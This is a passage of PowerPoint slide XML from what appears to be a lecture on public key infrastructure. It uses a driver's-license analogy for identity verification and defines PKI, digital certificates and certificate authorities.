            <a:headEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="965" name="Text Box 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2424240" y="1760400"/>
            <a:ext cx="4038120" cy="356040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Alice applies for a driver’s license.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="966" name="Line 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2224080" y="5875200"/>
            <a:ext cx="4252680" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="967" name="Text Box 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2424240" y="2446200"/>
            <a:ext cx="4038120" cy="767160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1500"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>She receives her driver’s license after her identity is proven</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="968" name="Text Box 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2362320" y="4265640"/>
            <a:ext cx="4038120" cy="356040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Alice attempts to cash a check.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="969" name="Text Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2362320" y="5221440"/>
            <a:ext cx="4038120" cy="630360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1001"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Her identity is accepted after her driver’s license is checked.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="970" name="Picture 19" descr="Woman"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="24980" t="0" r="16667" b="83603"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5792760" y="3276720"/>
            <a:ext cx="269640" cy="304560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="971" name="Group 25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5111640" y="3124080"/>
            <a:ext cx="1441080" cy="901440"/>
            <a:chOff x="5111640" y="3124080"/>
            <a:chExt cx="1441080" cy="901440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="972" name="Picture 17" descr=""/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="5111640" y="3124080"/>
              <a:ext cx="1441080" cy="901440"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="973" name="Group 21"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5178600" y="3371760"/>
              <a:ext cx="472680" cy="533160"/>
              <a:chOff x="5178600" y="3371760"/>
              <a:chExt cx="472680" cy="533160"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="974" name="Rectangle 20"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5178600" y="3371760"/>
                <a:ext cx="456840" cy="456840"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="975" name="Picture 18" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:srcRect l="24980" t="0" r="16667" b="83603"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5178600" y="3371760"/>
                <a:ext cx="472680" cy="533160"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="976" name="Group 22"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6216480" y="3371760"/>
              <a:ext cx="234720" cy="247320"/>
              <a:chOff x="6216480" y="3371760"/>
              <a:chExt cx="234720" cy="247320"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="977" name="Rectangle 23"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6216480" y="3371760"/>
                <a:ext cx="226800" cy="212040"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="978" name="Picture 24" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId7"/>
              <a:srcRect l="24980" t="0" r="16667" b="83603"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6216480" y="3371760"/>
                <a:ext cx="234720" cy="247320"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="979" name="Group 26"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="990720" y="3743280"/>
            <a:ext cx="533160" cy="380520"/>
            <a:chOff x="990720" y="3743280"/>
            <a:chExt cx="533160" cy="380520"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="980" name="Picture 27" descr=""/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId8"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="990720" y="3743280"/>
              <a:ext cx="533160" cy="380520"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="981" name="Group 28"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="1015200" y="3848040"/>
              <a:ext cx="174600" cy="225000"/>
              <a:chOff x="1015200" y="3848040"/>
              <a:chExt cx="174600" cy="225000"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="982" name="Rectangle 29"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="1015200" y="3848040"/>
                <a:ext cx="168840" cy="192960"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="983" name="Picture 30" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId9"/>
              <a:srcRect l="24980" t="0" r="16667" b="83603"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1015200" y="3848040"/>
                <a:ext cx="174600" cy="225000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="984" name="Group 31"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="1399320" y="3848040"/>
              <a:ext cx="86760" cy="104400"/>
              <a:chOff x="1399320" y="3848040"/>
              <a:chExt cx="86760" cy="104400"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="985" name="Rectangle 32"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="1399320" y="3848040"/>
                <a:ext cx="83520" cy="89280"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="986" name="Picture 33" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId10"/>
              <a:srcRect l="25060" t="0" r="16627" b="83633"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1399320" y="3848040"/>
                <a:ext cx="86760" cy="104400"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="987" name="Group 34"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5638680" y="5638680"/>
            <a:ext cx="609120" cy="456840"/>
            <a:chOff x="5638680" y="5638680"/>
            <a:chExt cx="609120" cy="456840"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="988" name="Picture 35" descr=""/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId11"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="5638680" y="5638680"/>
              <a:ext cx="609120" cy="456840"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="989" name="Group 36"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5667120" y="5764320"/>
              <a:ext cx="199800" cy="270000"/>
              <a:chOff x="5667120" y="5764320"/>
              <a:chExt cx="199800" cy="270000"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="990" name="Rectangle 37"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5667120" y="5764320"/>
                <a:ext cx="192960" cy="231480"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="991" name="Picture 38" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId12"/>
              <a:srcRect l="24980" t="0" r="16667" b="83603"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5667120" y="5764320"/>
                <a:ext cx="199800" cy="270000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="992" name="Group 39"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6105960" y="5764320"/>
              <a:ext cx="99000" cy="125280"/>
              <a:chOff x="6105960" y="5764320"/>
              <a:chExt cx="99000" cy="125280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="993" name="Rectangle 40"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6105960" y="5764320"/>
                <a:ext cx="95760" cy="107280"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="994" name="Picture 41" descr="Woman"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId13"/>
              <a:srcRect l="24947" t="0" r="16702" b="83605"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6105960" y="5764320"/>
                <a:ext cx="99000" cy="125280"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
          </p:pic>
        </p:grpSp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="995" name="Picture 43" descr="MCj04347130000[1]"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId14"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5867280" y="5410080"/>
            <a:ext cx="412560" cy="433080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="996" name="Picture 44" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId15"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352680" y="4572000"/>
            <a:ext cx="1371240" cy="555120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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PKI Terminology</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="998"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80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PKI </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A service framework (hardware, software, people, policies and procedures) needed to support large-scale public key-based technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Digital Certificate</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A document, which binds together the name of the entity and its public key and has been signed by the CA</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Certificate Authority (CA) </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The trusted third party that signs the public keys of entities in a PKI-based system</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A company that provides the services needed to manage the PKI</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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9"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CA Vendors and Sample Certificates</a:t>
